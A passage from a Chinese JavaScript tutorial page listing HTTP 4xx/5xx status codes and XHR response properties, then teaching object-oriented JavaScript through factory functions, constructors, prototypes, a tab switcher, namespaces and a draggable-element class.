<td style="text-align:left">服务器未满足请求者在请求中设置的其中一个前提条件。</td>
</tr>
<tr>
<td>413   （请求实体过大）</td>
<td style="text-align:left">服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。</td>
</tr>
<tr>
<td>414   （请求的 URI 过长）</td>
<td style="text-align:left">请求的 URI（通常为网址）过长，服务器无法处理。</td>
</tr>
<tr>
<td>415   （不支持的媒体类型）</td>
<td style="text-align:left">请求的格式不受请求页面的支持。</td>
</tr>
<tr>
<td>416   （请求范围不符合要求）</td>
<td style="text-align:left">如果页面无法提供请求的范围，则服务器会返回此状态代码。</td>
</tr>
<tr>
<td>417   （未满足期望值）</td>
<td style="text-align:left">服务器未满足”期望”请求标头字段的要求。</td>
</tr>
</tbody>
</table>
<h5><span id="5xx服务器错误">5xx（服务器错误）</span></h5><p>这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。</p>
<table>
<thead>
<tr>
<th>代码</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>500   （服务器内部错误）</td>
<td style="text-align:left">服务器遇到错误，无法完成请求。</td>
</tr>
<tr>
<td>501   （尚未实施）</td>
<td style="text-align:left">服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。</td>
</tr>
<tr>
<td>502   （错误网关）</td>
<td style="text-align:left">服务器作为网关或代理，从上游服务器收到无效响应。</td>
</tr>
<tr>
<td>503   （服务不可用）</td>
<td style="text-align:left">服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。</td>
</tr>
<tr>
<td>504   （网关超时）</td>
<td style="text-align:left">服务器作为网关或代理，但是没有及时从上游服务器收到请求。</td>
</tr>
<tr>
<td>505   （HTTP 版本不受支持）</td>
<td style="text-align:left">服务器不支持请求中所用的 HTTP 协议版本。</td>
</tr>
</tbody>
</table>
<h4><span id="服务器响应">服务器响应</span></h4><ul>
<li>responseText 属性：如果来自服务器的响应并非 XML，请使用 responseText 属性。</li>
<li>responseXML 属性：如果来自服务器的响应是 XML，而且需要作为 XML 对象进行解析，使用responseXML属性</li>
</ul>
<table>
<thead>
<tr>
<th>属性</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>responseText</td>
<td style="text-align:left">获得字符串形式的响应数据。</td>
</tr>
<tr>
<td>responseXML</td>
<td style="text-align:left">获得 XML 形式的响应数据。</td>
</tr>
</tbody>
</table>
<h1><span id="js面向对象基础">JS面向对象基础</span></h1><h2><span id="什么是对象">什么是对象</span></h2><ul>
<li>JavaScript 中的所有事物都是对象：字符串、数值、数组、函数</li>
<li>JavaScript 提供多个内建对象，比如 String、Date、Array 等等。</li>
<li>对象只是带有属性和方法的特殊数据类型。</li>
</ul>
<h2><span id="什么是面向对象">什么是面向对象</span></h2><ul>
<li>使用对象时，只关注对象提供的功能，不关注其内部细节</li>
<li>比如JQuery</li>
</ul>
<h2><span id="js中的面向对象">JS中的面向对象</span></h2><h3><span id="面向对象编程oop的特点">面向对象编程(OOP)的特点</span></h3><ul>
<li>抽象：抓住核心问题</li>
<li>封装：不考虑内部实现，只考虑功能使用</li>
<li>继承：从已有对象上，继承出新的对象<br>多重继承<br>多态</li>
</ul>
<h3><span id="对象的组成">对象的组成</span></h3><ul>
<li>方法——函数：过程、动态的</li>
<li>属性——变量：状态、静态的</li>
</ul>
<h4><span id="方法函数过程-动态的">方法——函数：过程、动态的</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function aaa()			//函数：自由</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;abc&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var arr=[1,2,3,4];</span><br><span class="line"></span><br><span class="line">arr.aaa=function ()		//方法：属于一个对象</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;abc&apos;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">aaa();</span><br><span class="line">arr.aaa();</span><br></pre></td></tr></table></figure>
<h4><span id="属性变量状态-静态的">属性——变量：状态、静态的</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var a=12;		//变量：自由的，不属于任何人</span><br><span class="line"></span><br><span class="line">alert(a);</span><br><span class="line"></span><br><span class="line">var arr=[1,2,3,4,5,6];</span><br><span class="line"></span><br><span class="line">arr.a=12;		//属性：属于一个对象的</span><br><span class="line"></span><br><span class="line">alert(arr.a);</span><br></pre></td></tr></table></figure>
<h2><span id="第一个面向对象程序">第一个面向对象程序</span></h2><h3><span id="为对象添加方法和属性">为对象添加方法和属性</span></h3><h4><span id="this详解事件处理中this的本质">this详解，事件处理中this的本质</span></h4><ul>
<li>当前发生事件的对象</li>
<li>当前的方法所属的对象</li>
</ul>
<h4><span id="不能在系统对象中随意附加方法-属性否则会覆盖已有方法-属性">不能在系统对象中随意附加方法、属性，否则会覆盖已有方法、属性</span></h4><h4><span id="object对象">object对象</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function createPerson(name, qq)		//构造函数</span><br><span class="line">&#123;</span><br><span class="line">	var obj=new Object();</span><br><span class="line">	</span><br><span class="line">	obj.name=name;</span><br><span class="line">	obj.qq=qq;</span><br><span class="line">	</span><br><span class="line">	obj.showName=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的名字叫：&apos;+this.name);</span><br><span class="line">	&#125;;</span><br><span class="line">	obj.showQQ=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的QQ号：&apos;+this.qq);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	return obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj=createPerson(&apos;blue&apos;, &apos;258248832&apos;);</span><br><span class="line"></span><br><span class="line">obj.showName();</span><br><span class="line">obj.showQQ();</span><br><span class="line"></span><br><span class="line">var obj2=createPerson(&apos;张三&apos;, &apos;45648979879&apos;);</span><br><span class="line"></span><br><span class="line">obj2.showName();</span><br><span class="line">obj2.showQQ();</span><br></pre></td></tr></table></figure>
<h2><span id="工厂方式">工厂方式</span></h2><h3><span id="什么是工厂">什么是工厂</span></h3><ul>
<li>原料</li>
<li>加工</li>
<li>出厂</li>
</ul>
<h3><span id="工厂方式">工厂方式</span></h3><ul>
<li>用构造函数创建一个类</li>
<li>什么是类、对象（实例）：模具和零件</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function createPerson(name, qq)		//构造函数</span><br><span class="line">&#123;</span><br><span class="line">	//原料</span><br><span class="line">	var obj=new Object();</span><br><span class="line">	</span><br><span class="line">	//加工</span><br><span class="line">	obj.name=name;</span><br><span class="line">	obj.qq=qq;</span><br><span class="line">	</span><br><span class="line">	obj.showName=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的名字叫：&apos;+this.name);</span><br><span class="line">	&#125;;</span><br><span class="line">	obj.showQQ=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的QQ号：&apos;+this.qq);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	//出厂</span><br><span class="line">	return obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj=createPerson(&apos;blue&apos;, &apos;258248832&apos;);</span><br><span class="line">var obj2=createPerson(&apos;张三&apos;, &apos;45648979879&apos;);</span><br><span class="line"></span><br><span class="line">alert(obj.showName==obj2.showName);</span><br></pre></td></tr></table></figure>
<h2><span id="工厂方式的问题">工厂方式的问题</span></h2><h3><span id="问题">问题</span></h3><ul>
<li>没有new</li>
<li>函数重复定义<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function createPerson(name, qq)		//构造函数</span><br><span class="line">&#123;</span><br><span class="line">	//原料</span><br><span class="line">	var obj=new Object();</span><br><span class="line">	</span><br><span class="line">	//加工</span><br><span class="line">	obj.name=name;</span><br><span class="line">	obj.qq=qq;</span><br><span class="line">	</span><br><span class="line">	obj.showName=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的名字叫：&apos;+this.name);</span><br><span class="line">	&#125;;</span><br><span class="line">	obj.showQQ=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的QQ号：&apos;+this.qq);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	//出厂</span><br><span class="line">	return obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj=createPerson(&apos;blue&apos;, &apos;258248832&apos;);</span><br><span class="line">var obj2=createPerson(&apos;张三&apos;, &apos;45648979879&apos;);</span><br><span class="line"></span><br><span class="line">alert(obj.showName==obj2.showName);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="加上new">加上new</span></h3><ul>
<li>偷偷做了两件事</li>
<li>替你创建了一个空白对象</li>
<li>替你返回了这个对象</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function createPerson(name, qq)		//构造函数</span><br><span class="line">&#123;</span><br><span class="line">	//系统偷偷替咱们做：</span><br><span class="line">	//var this=new Object();</span><br><span class="line">	</span><br><span class="line">	//加工</span><br><span class="line">	this.name=name;</span><br><span class="line">	this.qq=qq;</span><br><span class="line">	</span><br><span class="line">	this.showName=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的名字叫：&apos;+this.name);</span><br><span class="line">	&#125;;</span><br><span class="line">	this.showQQ=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的QQ号：&apos;+this.qq);</span><br><span class="line">	&#125;;</span><br><span class="line">	</span><br><span class="line">	//也会偷偷做一些：</span><br><span class="line">	//return this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj=new createPerson(&apos;blue&apos;, &apos;258248832&apos;);</span><br><span class="line">var obj2=new createPerson(&apos;张三&apos;, &apos;45648979879&apos;);   //new</span><br><span class="line"></span><br><span class="line">obj.showName();</span><br><span class="line">obj.showQQ();</span><br><span class="line">//alert(obj.showName==obj2.showName);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="原型prototype">原型——prototype</span></h2><h3><span id="什么是原型">什么是原型</span></h3><ul>
<li>原型是class，修改他可以影响一类元素</li>
<li>在已有对象中加入自己的属性、方法</li>
<li>原型修改对已有对象的影响</li>
</ul>
<h3><span id="为array添加sum方法">为Array添加sum方法</span></h3><ul>
<li>给对象添加方法，类似于行间样式</li>
<li>给原型添加方法，类似于class</li>
</ul>
<h3><span id="原型的小缺陷">原型的小缺陷</span></h3><ul>
<li>无法限制覆盖</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">var arr1=new Array(12,55,34,78,676);</span><br><span class="line">var arr2=new Array(12,33, 1);</span><br><span class="line"></span><br><span class="line">Array.prototype.sum=function ()	//class</span><br><span class="line">//arr1.sum=function ()				//行间样式</span><br><span class="line">&#123;</span><br><span class="line">	var result=0;</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;this.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		result+=this[i];</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	return result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">alert(arr1.sum());</span><br><span class="line">alert(arr2.sum());	//?</span><br></pre></td></tr></table></figure>
<h2><span id="流行的面向对象编写方式">流行的面向对象编写方式</span></h2><h3><span id="用混合方式构造对象">用混合方式构造对象</span></h3><ul>
<li>混合的的构造函数/原型方式</li>
<li>Mixed Constructor Function/Prototype Method</li>
</ul>
<h3><span id="原则">原则</span></h3><ul>
<li>构造函数：加属性</li>
<li>原型：加方法</li>
</ul>
<h3><span id="对象命名规范">对象命名规范</span></h3><ul>
<li>类名首字母大写</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function CreatePerson(name, qq)		//构造函数</span><br><span class="line">&#123;</span><br><span class="line">	this.name=name;</span><br><span class="line">	this.qq=qq;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CreatePerson.prototype.showName=function ()	//原型</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;我的名字叫：&apos;+this.name);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">CreatePerson.prototype.showQQ=function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;我的QQ号：&apos;+this.qq);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var obj=new CreatePerson(&apos;blue&apos;, &apos;258248832&apos;);</span><br><span class="line">var obj2=new CreatePerson(&apos;张三&apos;, &apos;45648979879&apos;);</span><br><span class="line"></span><br><span class="line">/*obj.showName();</span><br><span class="line">obj.showQQ();</span><br><span class="line"></span><br><span class="line">obj2.showName();</span><br><span class="line">obj2.showQQ();*/</span><br><span class="line">alert(obj.showName==obj2.showName);</span><br></pre></td></tr></table></figure>
<h1><span id="js面向对象实例">JS面向对象实例</span></h1><h2><span id="实例面向对象的选项卡">实例：面向对象的选项卡</span></h2><h3><span id="把面向过程的程序改写成面向对象的形式">把面向过程的程序，改写成面向对象的形式</span></h3><h4><span id="原则">原则</span></h4><ul>
<li>不能有函数套函数、但可以有全局变量</li>
</ul>
<h4><span id="过程">过程</span></h4><ul>
<li>onload        →   构造函数</li>
<li>全局变量    →    属性</li>
<li>函数        →    方法</li>
</ul>
<h4><span id="改错">改错</span></h4><ul>
<li>this、事件、闭包、传参</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#div1 input &#123;background:white;&#125;</span><br><span class="line">#div1 input.active &#123;background:yellow;&#125;</span><br><span class="line">#div1 div &#123;width:200px; height:200px; background:#CCC; display:none;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	new TabSwitch(&apos;div1&apos;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function TabSwitch(id)</span><br><span class="line">&#123;</span><br><span class="line">	var _this=this;</span><br><span class="line">	var oDiv=document.getElementById(id);</span><br><span class="line">	</span><br><span class="line">	this.aBtn=oDiv.getElementsByTagName(&apos;input&apos;);</span><br><span class="line">	this.aDiv=oDiv.getElementsByTagName(&apos;div&apos;);</span><br><span class="line">	</span><br><span class="line">	for(var i=0;i&lt;this.aBtn.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		this.aBtn[i].index=i;</span><br><span class="line">		this.aBtn[i].onclick=function ()</span><br><span class="line">		&#123;</span><br><span class="line">			_this.fnClick(this);</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">TabSwitch.prototype.fnClick=function (oBtn)</span><br><span class="line">&#123;</span><br><span class="line">	//alert(this);</span><br><span class="line">	for(var i=0;i&lt;this.aBtn.length;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		this.aBtn[i].className=&apos;&apos;</span><br><span class="line">		this.aDiv[i].style.display=&apos;none&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	oBtn.className=&apos;active&apos;;</span><br><span class="line">	this.aDiv[oBtn.index].style.display=&apos;block&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;</span><br><span class="line">&lt;input class=&quot;active&quot; type=&quot;button&quot; value=&quot;aaa&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;bbb&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;button&quot; value=&quot;ccc&quot; /&gt;</span><br><span class="line">&lt;div style=&quot;display:block;&quot;&gt;aaa&lt;/div&gt;</span><br><span class="line">&lt;div&gt;dfsadf&lt;/div&gt;</span><br><span class="line">&lt;div&gt;erwqerwe&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="对象与闭包">对象与闭包</span></h3><p>有权访问另一个函数作用域内变量的函数都是闭包<br>通过闭包传递this</p>
<h1><span id="js面向对象高级">JS面向对象高级</span></h1><h2><span id="json方式的面向对象">Json方式的面向对象</span></h2><h3><span id="把方法包在一个json里">把方法包在一个Json里</span></h3><ul>
<li>有人管他叫——命名空间</li>
<li>在公司里，把同一类方法，包在一起</li>
<li>不适合多个对象</li>
</ul>
<h4><span id="json的对象">Json的对象</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">var json=&#123;</span><br><span class="line">	name: &apos;blue&apos;,</span><br><span class="line">	qq: &apos;258248832&apos;,</span><br><span class="line">	</span><br><span class="line">	showName: function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的名字叫：&apos;+this.name);</span><br><span class="line">	&#125;,</span><br><span class="line">	showQQ: function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的QQ号是：&apos;+this.qq);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var json2=&#123;</span><br><span class="line">	name: &apos;...&apos;,</span><br><span class="line">	qq: &apos;258248832&apos;,</span><br><span class="line">	</span><br><span class="line">	showName: function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的名字叫：&apos;+this.name);</span><br><span class="line">	&#125;,</span><br><span class="line">	showQQ: function ()</span><br><span class="line">	&#123;</span><br><span class="line">		alert(&apos;我的QQ号是：&apos;+this.qq);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">json.showName();</span><br><span class="line">json.showQQ();</span><br></pre></td></tr></table></figure>
<h4><span id="命名空间">命名空间</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">var zns=&#123;&#125;;</span><br><span class="line"></span><br><span class="line">zns.common=&#123;&#125;;</span><br><span class="line">zns.fx=&#123;&#125;;</span><br><span class="line">zns.site=&#123;&#125;;</span><br><span class="line"></span><br><span class="line">zns.common.getUser=function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;a&apos;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zns.fx.getUser=function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;b&apos;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zns.site.getUser=function ()</span><br><span class="line">&#123;</span><br><span class="line">	alert(&apos;c&apos;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">zns.common.getUser();</span><br><span class="line">zns.fx.getUser();</span><br><span class="line">zns.site.getUser();</span><br></pre></td></tr></table></figure>
<h2><span id="拖拽和继承">拖拽和继承</span></h2><h3><span id="面向对象的拖拽">面向对象的拖拽</span></h3><ul>
<li>改写原有拖拽</li>
</ul>
<h3><span id="对象的继承">对象的继承</span></h3><ul>
<li>什么是继承<br> 在原有类的基础上，略作修改，得到一个新的类<br> 不影响原有类的功能</li>
</ul>
<h3><span id="instanceof运算符">instanceof运算符</span></h3><ul>
<li>查看对象是否是某个类的实例</li>
</ul>
<h3><span id="父类">父类</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">function Drag(id)</span><br><span class="line">&#123;</span><br><span class="line">	var _this=this;</span><br><span class="line">	this.disX=0;</span><br><span class="line">	this.disY=0;</span><br><span class="line">	</span><br><span class="line">	this.oDiv=document.getElementById(id);</span><br><span class="line">	this.oDiv.onmousedown=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		_this.fnDown(ev);</span><br><span class="line">		</span><br><span class="line">		return false;</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Drag.prototype.fnDown=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var _this=this;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	</span><br><span class="line">	this.disX=oEvent.clientX-this.oDiv.offsetLeft;</span><br><span class="line">	this.disY=oEvent.clientY-this.oDiv.offsetTop;</span><br><span class="line">	</span><br><span class="line">	document.onmousemove=function (ev)</span><br><span class="line">	&#123;</span><br><span class="line">		_this.fnMove(ev);</span><br><span class="line">	&#125;;</span><br><span class="line">	document.onmouseup=function ()</span><br><span class="line">	&#123;</span><br><span class="line">		_this.fnUp();</span><br><span class="line">	&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Drag.prototype.fnMove=function (ev)</span><br><span class="line">&#123;</span><br><span class="line">	var oEvent=ev||event;</span><br><span class="line">	</span><br><span class="line">	this.oDiv.style.left=oEvent.clientX-this.disX+&apos;px&apos;;</span><br><span class="line">	this.oDiv.style.top=oEvent.clientY-this.disY+&apos;px&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Drag.prototype.fnUp=function ()</span><br><span class="line">&#123;</span><br><span class="line">	document.onmousemove=null;</span><br><span class="line">	document.onmouseup=null;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3><span id="html部分">HTML部分</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#div1 &#123;width:200px; height:200px; background:yellow; position:absolute;&#125;</span><br><span class="line">#div2 &#123;width:200px; height:200px; background:green; position:absolute;&#125;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;Drag.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;LimitDrag.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">window.onload=function ()</span><br><span class="line">&#123;</span><br><span class="line">	new Drag(&apos;div1&apos;);</span><br><span class="line">	new LimitDrag(&apos;div2&apos;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;普通拖拽&lt;/div&gt;</span><br><span class="line">&lt;div id=&quot;div2&quot;&gt;限制范围&lt;/div&gt;</span><br></pre></td></tr></table></figure>
